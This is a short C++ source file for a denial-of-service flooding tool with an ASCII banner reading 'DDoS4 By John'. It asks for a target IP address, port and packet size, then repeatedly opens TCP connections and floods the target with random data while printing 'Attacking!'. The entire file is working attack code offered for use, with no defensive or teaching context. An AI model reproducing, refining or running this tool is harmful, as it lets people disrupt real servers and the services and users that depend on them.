#include <iostream>
#include <boost/asio.hpp>

using namespace boost::asio;
using ip::tcp;

void sendMessages(tcp::socket socket, int bytes) {
	char *heap = new char[bytes];
	int i = 0;
	while (i < bytes) {
		heap[i] = rand() % 10 + '0'; // random char
		i++;
	}
	while (true) {
		try {
			write(socket, boost::asio::buffer(std::string(heap)));}
		catch (boost::system::system_error e) {break;}
	}
	socket.close();
	delete heap;
}

int main() {
	std::cout << "____________      _____ _   _   ___  ______           ___       _           \n|  _  |  _  \\    /  ___| | | | /   | | ___ \\         |_  |     | |          \n| | | | | | |___ \\ `--.| | | |/ /| | | |_/ /_   _      | | ___ | |__  _ __  \n| | | | | | / _ \\ `--. | | | / /_| | | ___ | | | |     | |/ _ \\| '_ \\| '_ \\ \n| |/ /| |/ | (_) /\\__/ \\ \\_/ \\___  | | |_/ | |_| | /\\__/ | (_) | | | | | | |\n|___/ |___/ \\___/\\____/ \\___/    |_/ \\____/ \\__, | \\____/ \\___/|_| |_|_| |_|\n                                             __/ |                          \n                                            |___/                           \n";
	std::string ip;
	std::string port;
	int bytes;
	std::cout << "Ip for IpV4 DDoS: ";
	std::cin >> ip;
	std::cout << "Port of " + std::string(ip) + ": ";
	std::cin >> port;
	std::cout << "Bytes at package (standart 512): ";
	std::cin >> bytes;
	bool isFirstConnect = true;
	while (true) {
		io_context io_context; // create net interface
		tcp::socket socket(io_context);
		tcp::resolver resolver(io_context);
		try {
			connect(socket, resolver.resolve(ip, port));
			if (isFirstConnect) {
				std::cout << "\n[+] Connected. Attacking!\n";
				isFirstConnect = false;
			}
		} catch (...) {std::cout << "\n[-] Server dont responsing! (Connection failed, try other server or attack machine ip)\n";}
		sendMessages(std::move(socket), bytes);
	}
	return 0;
}